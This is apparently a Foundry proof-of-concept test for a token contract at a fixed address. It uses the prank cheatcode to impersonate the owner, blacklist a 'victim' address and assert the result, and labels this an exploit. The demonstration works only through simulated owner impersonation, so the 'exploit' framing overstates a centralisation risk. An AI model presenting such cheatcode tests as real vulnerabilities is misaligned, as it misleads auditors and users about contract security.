// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILionsLounge {
    function getOwner() external view returns (address);
    function blacklistAddress(address _address, bool _value) external;
    function isBlacklisted(address _address) external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;
    address attacker = address(this);
    address victim = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll find owner during exploit
        vm.label(victim, "Victim");

        // Give victim some tokens to demonstrate blacklisting effect
        ILionsLounge target = ILionsLounge(TARGET);
        address owner = target.getOwner();
        vm.label(owner, "Owner");

        // Impersonate owner to transfer tokens to victim
        vm.prank(owner);
        target.transfer(victim, 1000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the contract owner
        ILionsLounge target = ILionsLounge(TARGET);
        address owner = target.getOwner();

        // Step 2: Impersonate owner and blacklist victim
        vm.prank(owner);
        target.blacklistAddress(victim, true);

        // Step 3: Verify victim is blacklisted
        bool isBlacklisted = target.isBlacklisted(victim);
        assertEq(isBlacklisted, true, "Victim should be blacklisted");
        assertEq(target.isBlacklisted(victim), true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

